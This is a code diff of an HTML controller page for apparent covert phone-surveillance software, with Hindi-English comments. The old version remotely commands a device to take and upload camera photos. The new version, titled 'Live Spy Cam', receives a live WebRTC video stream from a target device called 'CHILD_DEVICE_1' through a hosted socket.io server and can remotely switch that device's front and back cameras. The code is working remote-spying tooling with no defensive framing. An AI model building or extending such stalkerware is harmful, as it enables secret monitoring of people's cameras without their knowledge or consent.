@@ -3,146 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudinary Camera View</title>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+    <title>Live Camera Monitor</title>
     <style>
-        body { margin: 0; background: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; }
-        
-        .header { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-        .status { font-size: 0.9rem; color: #888; }
-        .online { color: #00ff88; font-weight: bold; }
-
-        /* Photo Area */
-        .photo-area { 
-            flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            padding: 20px;
-        }
-
-        #displayedImage { 
-            max-width: 90%; max-height: 70vh; 
-            border: 2px solid #333; border-radius: 10px; 
-            display: none; /* Pehle chhupa rahega */
-            box-shadow: 0 0 20px rgba(0,255,136, 0.2);
-        }
-
-        .loader { display: none; text-align: center; }
-        .fa-spin { color: #00ff88; margin-bottom: 10px; }
-
-        /* Button Area */
-        .controls { 
-            background: #111; padding: 20px; text-align: center; 
-            border-top: 1px solid #333;
-        }
-
-        .btn {
-            background: linear-gradient(45deg, #00c6ff, #0072ff);
-            border: none; color: white; padding: 15px 30px;
-            font-size: 18px; border-radius: 50px; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
-            transition: 0.3s;
-        }
-        .btn:active { transform: scale(0.95); }
-        .btn:disabled { background: #444; cursor: not-allowed; }
-
+        body { font-family: sans-serif; background: #111; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        h2 { margin-bottom: 10px; color: #00d2ff; }
+        video { width: 90%; max-width: 600px; border: 2px solid #333; border-radius: 10px; background: black; box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); }
+        .controls { margin-top: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #00d2ff; border: none; border-radius: 5px; color: #000; font-weight: bold; }
+        button:hover { background: #00aacc; }
+        #status { margin-top: 10px; font-size: 14px; color: #aaa; }
     </style>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 </head>
 <body>
 
-    <div class="header">
-        <div><i class="fa-solid fa-cloud"></i> CLOUD CAM</div>
-        <div id="status" class="status">Connecting...</div>
-    </div>
-
-    <div class="photo-area">
-        <h3 id="msg" style="color: #444;">Click button to capture</h3>
-
-        <div id="loader" class="loader">
-            <i class="fa-solid fa-circle-notch fa-3x fa-spin"></i>
-            <p>Capturing & Uploading to Cloud...</p>
-        </div>
-
-        <img id="displayedImage" src="" alt="Cloud Photo">
-    </div>
-
+    <h2>🎥 Live Spy Cam</h2>
+    <video id="remoteVideo" autoplay playsinline></video>
+    
     <div class="controls">
-        <button id="capBtn" class="btn" onclick="captureToCloud()">
-            <i class="fa-solid fa-camera"></i> Capture & Upload
-        </button>
+        <button onclick="switchCamera()">🔄 Switch Camera (Front/Back)</button>
     </div>
+    <div id="status">Waiting for connection...</div>
 
     <script>
-        // 🔥 Apna Server URL yaha daalo
-        const SERVER_URL = "https://child-v9no.onrender.com"; 
+        const socket = io("https://child-v9no.onrender.com"); // ✅ Tumhara Server
+        const remoteVideo = document.getElementById("remoteVideo");
+        const statusText = document.getElementById("status");
+
+        let peerConnection;
+        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
         
-        let socket;
-        // URL se device ID nikalo (?id=12345)
-        let deviceId = new URLSearchParams(window.location.search).get('id');
+        // Target Device ID (Jo App me dala hai wahi yaha hona chahiye)
+        const TARGET_DEVICE = "CHILD_DEVICE_1"; 
 
-        const imgTag = document.getElementById('displayedImage');
-        const loader = document.getElementById('loader');
-        const msg = document.getElementById('msg');
-        const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('capBtn');
+        socket.on("connect", () => {
+            statusText.innerText = "✅ Connected to Server. Joining as ADMIN...";
+            socket.emit("join-room", "ADMIN");
+        });
 
-        if(!deviceId) {
-            statusDiv.innerText = "Error: No Device ID";
-            btn.disabled = true;
-        } else {
-            init();
-        }
+        // 1. Offer Recieved from Mobile
+        socket.on("offer", async (data) => {
+            statusText.innerText = "📩 Incoming Stream...";
+            
+            peerConnection = new RTCPeerConnection(config);
+            
+            peerConnection.ontrack = (event) => {
+                remoteVideo.srcObject = event.streams[0];
+                statusText.innerText = "🔴 Live Streaming";
+            };
 
-        function init() {
-            socket = io(SERVER_URL);
-
-            socket.on("connect", () => {
-                statusDiv.innerHTML = 'Status: <span class="online">Online</span>';
-                socket.emit("join", deviceId); // Admin room join
-            });
-
-            socket.on("disconnect", () => {
-                statusDiv.innerText = "Status: Offline";
-            });
-
-            // 🔥 Yaha Cloudinary ka Link aayega
-            // Event ka naam 'cloud_url' rakha hai (Server/App same bheje)
-            socket.on("cloud_url", (data) => {
-                console.log("Photo URL aa gaya:", data);
-                
-                // Hide Loader
-                loader.style.display = "none";
-                
-                // Show Image
-                if(data && data.startsWith("http")) {
-                    imgTag.src = data;
-                    imgTag.style.display = "block";
-                    msg.style.display = "none";
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fa-solid fa-camera"></i> Capture Again';
-                } else {
-                    alert("Invalid URL received: " + data);
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit("candidate", {
+                        target: TARGET_DEVICE,
+                        type: "candidate",
+                        candidate: event.candidate.candidate,
+                        sdpMid: event.candidate.sdpMid,
+                        sdpMLineIndex: event.candidate.sdpMLineIndex
+                    });
                 }
+            };
+
+            await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+
+            socket.emit("answer", {
+                target: TARGET_DEVICE,
+                type: "answer",
+                sdp: answer.sdp
             });
-        }
+        });
 
-        function captureToCloud() {
-            if(!socket.connected) { alert("Server not connected"); return; }
+        // 2. ICE Candidates Handling
+        socket.on("candidate", (data) => {
+            if (peerConnection) {
+                peerConnection.addIceCandidate(new RTCIceCandidate({
+                    candidate: data.candidate,
+                    sdpMid: data.sdpMid,
+                    sdpMLineIndex: data.sdpMLineIndex
+                }));
+            }
+        });
 
-            // UI Update
-            imgTag.style.display = "none";
-            msg.style.display = "none";
-            loader.style.display = "block";
-            btn.disabled = true;
-            btn.innerText = "Wait...";
-
-            // Send Command to Android
-            // Command: 'camera_upload' (Taki App samajh jaye ki Cloud pe dalna hai)
-            socket.emit("command", {
-                room: deviceId,
-                command: "camera_upload" 
-            });
+        // 🔥 Send Switch Camera Command
+        function switchCamera() {
+            statusText.innerText = "🔄 Sending Switch Command...";
+            socket.emit("switch-camera", { target: TARGET_DEVICE });
         }
     </script>
+
 </body>
 </html>
